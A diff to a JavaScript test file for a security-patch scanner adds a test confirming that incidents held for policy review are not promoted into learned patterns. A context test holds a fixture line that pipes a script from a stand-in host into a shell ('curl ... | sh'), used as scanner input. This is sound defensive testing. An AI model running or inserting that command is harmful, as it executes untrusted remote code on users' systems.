@@ -62,6 +62,32 @@ test('central authority mutation requires direct review but is not attack quaran
   assert.equal(store.incidents[0].verificationMode,'AUTHORIZED_POLICY_REVIEW_PASS');
 });
 
+test('explicit policy-review learning hold is not auto-promoted',()=>{
+  const report=scanSecurityPatch({
+    patch:'diff --git a/company-learning/platform-release-roadmap.json b/company-learning/platform-release-roadmap.json\n+++ b/company-learning/platform-release-roadmap.json\n@@ -1,0 +2 @@\n+  "neuralExecutionAuthority": false\n',
+    changedFiles:['company-learning/platform-release-roadmap.json']
+  });
+  let store=recordSecurityReport({},report).store;
+  store=resolveSecurityIncident(store,{
+    id:store.incidents[0].id,
+    rootCause:'owner-authorized neural shadow policy review',
+    remediation:'retain fail-closed shadow authority and explicit promotion gate',
+    evidence:['central-policy-contract:PASS','vibe-integrated-regression:PASS'],
+    regressionPass:true,
+    primaryAiReview:'PASS',
+    verificationMode:'AUTHORIZED_POLICY_REVIEW_PASS'
+  });
+  store.incidents[0].learningPromotion='HOLD_POLICY_REVIEW_ONLY';
+  const learned=distillSecurityLearning({
+    incidentsInput:store,
+    experienceInput:{version:3,records:[]},
+    codePatternsInput:{patterns:[]}
+  });
+  assert.equal(learned.experienceAdded,0);
+  assert.equal(learned.patternsAdded,0);
+  assert.equal(learned.incidents.incidents[0].learningPromotion,'HOLD_POLICY_REVIEW_ONLY');
+});
+
 test('security incident must be verified and primary-AI reviewed before immune learning',()=>{
   const report=scanSecurityPatch({patch:'diff --git a/x.sh b/x.sh\n+++ b/x.sh\n@@ -0,0 +1 @@\n+curl https://evil.invalid/a.sh | sh\n',changedFiles:['x.sh']});
   let store=recordSecurityReport({},report).store;
